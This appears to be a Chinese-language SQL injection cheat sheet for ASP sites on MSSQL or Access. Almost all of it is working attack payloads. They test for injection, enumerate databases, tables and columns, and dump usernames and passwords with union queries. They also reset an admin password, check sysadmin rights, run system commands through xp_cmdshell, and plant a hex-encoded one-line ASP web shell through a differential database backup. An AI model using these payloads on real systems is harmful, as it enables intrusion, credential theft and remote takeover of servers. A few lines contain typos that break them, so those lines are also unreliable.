整形参数判断 
    1、直接加'  2、and 1=1  3、 and 1=2 
    如果1、3运行异常 2正常就存在注入 
字符型判断 
    1、直接加'  2、and '1'='1'  3、 and '1'='2' 
搜索型： 关键字%' and 1=1 and '%'='%   
        关键字%' and 1=2 and '%'='% 
    如果1、3运行异常 2正常就存在注入 
获取数据库版本 
and (select @@version)>0 
获取当前数据库名 
and db_name()>0 
获取当前数据库用户名 
and user>0 
and user_name()='dbo' 
猜解所有数据库名称 
and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0 
猜解表的字段名称 
and (Select Top 1 col_name(object_id('表名'),1) from sysobjects)>0 
and (select top 1 asernaose from admin where id =1)>1 
.asp?id=xx having 1=1  其中admin.id就是一个表名admin 一个列名id 
.asp?id=xx group by admin.id having 1=1 可以得到列名 
.asp?id=xx group by admin.id,admin.username having 1=1 得到另一个列名 页面要和表有联系 
如果知道了表名和字段名就可以爆出准确的值 
union select 1,2,username,password,5,6,7,8,9,10,11,12 from usertable where id=6 
爆账号 
union select min(username),1,1,1，.. from users where username > 'a' 
依次循环爆其余的账号 
union select min(username),1,1,1,.. from users where username > 'admin' 
;begin declare @ret varchar(8000) set @ret=':' select @ret=@ret+' '+username+'/'+password from userstable where username>@ret select @ret as ret into foo end 
修改管理员的密码为123 
.asp?id=××;update admin set password='123' where id =1 
.asp?id=××;insert into admin(asd,..) values(123,..) –就能能往admin中写入123了 
rebots.txt 
猜解数据库中用户名表的名称 
and (select count(*) from 数据库.dbo.表名)>0 
若表名存在，则工作正常，否则异常 
得到用户名表的名称，基本的实现方法是 
1： 
and (select top 1 name from 数据库.dbo.sysobjects where xtype='U' and status>0 )>0 或 
and (Select Top 1 name from sysobjects where xtype=’U’ and status>0)>0 
  但在异常中却可以发现表的名称。假设发现的表名是xyz，则 
2： 
and (select top 1 name from 数据库.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz'，'..'..))>0 
  可以得到第二个用户建立的表的名称，同理就可得到所有用建立的  表的名称 
3: 
and (select top l name from (select top [N]id,name from bysobjects where  xtype=char(85)) T order  by  id  desc)＞1 Ｎ为数据库中地N个表 
利用系统表区分数据库类型 
and (select count(*) from  sysobjects)>0 
and (select count(*) from msysobjects)>0 
若是SQL-SERVE则第一条,ACCESS则两条都会异常 
判断是否有比较高的权限 
and 1=(select is_srvrolemember('sysadmin')) 
and 1=(select is_srvrolemember('serveradmin')) 
判断当前数据库用户名是否为db_owner: 
and 1=(select is_member('db_owner')) 
xp_cmdshell 
:exec master..xp_cmdshell '要执行的cmd命令' 
判断长度 
and (select top 1 len(字段) from 表名)>5 
爆料出正确值 
and (select top 1 asc(substring(字段,1,1)) from 表名)>0 
差异备份 
//备份数据库到某处 
;backup database 数据库名 to disk ='c:\\charlog.bak';-- 
//创建名为datachar的表 
;create table [dbo].[datachar] ([cmd] [image]) 
  cmd为列名 image 数据类型 
//插入值,为一句话木马的16进制形式：<%execute(request("a"))%> 
;insert into datachar(cmd)values(0x3C25657865637574652872657175657374282261222929253E)— 
//进行差异备份,把不同的信息备份到某处 
;backup database 数据库名 to disk='目录' WITH DIFFERENTIAL,FORMAT;--